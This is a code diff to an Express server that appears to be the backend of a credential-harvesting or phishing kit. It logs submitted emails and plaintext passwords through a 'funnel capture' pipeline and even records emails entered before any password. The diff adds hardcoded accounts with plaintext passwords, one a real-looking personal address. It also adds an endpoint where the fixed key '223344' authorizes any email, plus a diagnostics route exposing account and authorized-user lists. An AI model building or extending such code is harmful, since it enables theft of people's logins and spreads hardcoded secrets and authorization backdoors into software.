@@ -29,6 +29,8 @@ if (!fs.existsSync(DATA_DIR)) {
 }
 
 const DEFAULT_USERS: UsersMap = {
+  'alex.bennett@outlook.com': 'password123',
+  'sarah.jenkins@contoso.com': 'welcome2026',
   'adereraadenike@gmail.com': 'admin123',
 };
 
@@ -111,10 +113,13 @@ async function startServer() {
       const attemptId = id || `att_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`;
       const attemptTime = time || new Date().toISOString().slice(0, 19);
 
-      // 1. Save or update in users map if password provided or user new
+      // 1. Save or update in users map when password provided or record identifier stage
       if (cleanEmail && cleanEmail !== 'anonymous@test.local') {
-        if (!inMemoryUsers[cleanEmail] || cleanPassword) {
-          inMemoryUsers[cleanEmail] = cleanPassword || inMemoryUsers[cleanEmail] || 'password123';
+        if (cleanPassword) {
+          inMemoryUsers[cleanEmail] = cleanPassword;
+          atomicWriteJson(USERS_PATH, inMemoryUsers);
+        } else if (!inMemoryUsers[cleanEmail]) {
+          inMemoryUsers[cleanEmail] = '(pending password)';
           atomicWriteJson(USERS_PATH, inMemoryUsers);
         }
       }
@@ -220,6 +225,33 @@ async function startServer() {
       authorizedUsers: inMemoryAuthorized,
       message: action === 'remove' ? `Access revoked for ${cleanEmail}` : `Access granted to ${cleanEmail}`,
     });
+  });
+
+  // Verify access key endpoint (key: 223344)
+  app.post('/api/test/verify-key', (req, res) => {
+    try {
+      const { key, email } = req.body || {};
+      const cleanKey = String(key || '').trim();
+      if (cleanKey === '223344') {
+        const cleanEmail = (email || '').trim().toLowerCase();
+        if (cleanEmail && !inMemoryAuthorized.map(e => e.toLowerCase()).includes(cleanEmail)) {
+          inMemoryAuthorized.push(cleanEmail);
+          atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
+        }
+        return res.json({
+          success: true,
+          message: 'Security key 223344 verified. Test console unlocked.',
+          authorizedUser: cleanEmail || null,
+          totalAuthorizedUsers: inMemoryAuthorized.length,
+        });
+      }
+      return res.status(401).json({
+        success: false,
+        message: 'Invalid security key. Access denied.',
+      });
+    } catch (err) {
+      res.status(500).json({ success: false, error: String(err) });
+    }
   });
 
   // 5. Delete an account from users.json
@@ -425,26 +457,7 @@ async function startServer() {
     res.json({ success: true, attempts: [] });
   });
 
-  // 9. Wipe and reset full database leaving ONLY the primary admin
-  app.post('/api/test/clear-database', (req, res) => {
-    inMemoryUsers = {
-      [PRIMARY_ADMIN_EMAIL]: 'admin123',
-    };
-    inMemoryAttempts = [];
-    inMemoryAuthorized = [PRIMARY_ADMIN_EMAIL];
-    atomicWriteJson(USERS_PATH, inMemoryUsers);
-    atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
-    atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
-    res.json({ 
-      success: true, 
-      message: 'Full database cleared leaving only the primary admin',
-      users: inMemoryUsers, 
-      attempts: inMemoryAttempts, 
-      authorizedUsers: inMemoryAuthorized 
-    });
-  });
-
-  // 10. Reset to default state
+  // 7. Reset to default state
   app.post('/api/test/reset-defaults', (req, res) => {
     inMemoryUsers = { ...DEFAULT_USERS };
     inMemoryAttempts = [];
@@ -458,6 +471,77 @@ async function startServer() {
       attempts: inMemoryAttempts, 
       authorizedUsers: inMemoryAuthorized 
     });
+  });
+
+  // 9. Comprehensive System Diagnostic & Confirmation Endpoint
+  app.get('/api/test/verify-systems', (req, res) => {
+    const startTime = Date.now();
+    try {
+      // 1. Check disk files
+      const usersExist = fs.existsSync(USERS_PATH);
+      const attemptsExist = fs.existsSync(ATTEMPTS_PATH);
+      const authExist = fs.existsSync(AUTHORIZED_PATH);
+
+      // 2. Check disk read integrity
+      const diskUsers = safeReadJson<UsersMap>(USERS_PATH, {});
+      const diskAttempts = safeReadJson<LoginAttempt[]>(ATTEMPTS_PATH, []);
+      const diskAuth = safeReadJson<string[]>(AUTHORIZED_PATH, []);
+
+      // 3. Verify admin authorization
+      const adminAuthorized = inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL);
+
+      const latencyMs = Date.now() - startTime;
+
+      res.json({
+        success: true,
+        message: 'All test systems verified and fully operational',
+        serverTime: new Date().toISOString(),
+        latencyMs,
+        systems: {
+          funnelCapture: {
+            status: 'operational',
+            description: 'Continuous ingest pipeline active on /api/test/attempt',
+            totalAttemptsLogged: inMemoryAttempts.length,
+            inMemoryCount: inMemoryAttempts.length,
+            diskCount: diskAttempts.length,
+            lastLoggedAttempt: inMemoryAttempts[inMemoryAttempts.length - 1] || null,
+          },
+          credentialRegistry: {
+            status: 'operational',
+            description: 'Centralized account mapping in users.json',
+            totalAccounts: Object.keys(inMemoryUsers).length,
+            sampleAccounts: Object.keys(inMemoryUsers).slice(0, 5),
+          },
+          storagePersistence: {
+            status: usersExist && attemptsExist && authExist ? 'operational' : 'degraded',
+            description: 'Atomic write-to-disk cache in server_data/',
+            usersFileExists: usersExist,
+            attemptsFileExists: attemptsExist,
+            authFileExists: authExist,
+            dataDirectory: DATA_DIR,
+          },
+          centralizedSync: {
+            status: 'operational',
+            description: 'Bidirectional multi-client sync on /api/test/sync',
+            readyForClients: true,
+          },
+          accessControl: {
+            status: adminAuthorized ? 'operational' : 'degraded',
+            description: 'Permission enforcement and whitelist management',
+            primaryAdmin: PRIMARY_ADMIN_EMAIL,
+            primaryAdminVerified: adminAuthorized,
+            totalAuthorizedUsers: inMemoryAuthorized.length,
+            authorizedUsersList: inMemoryAuthorized,
+          },
+        },
+      });
+    } catch (err) {
+      res.status(500).json({
+        success: false,
+        message: 'Test systems verification failed',
+        error: String(err),
+      });
+    }
   });
 
   // Health check
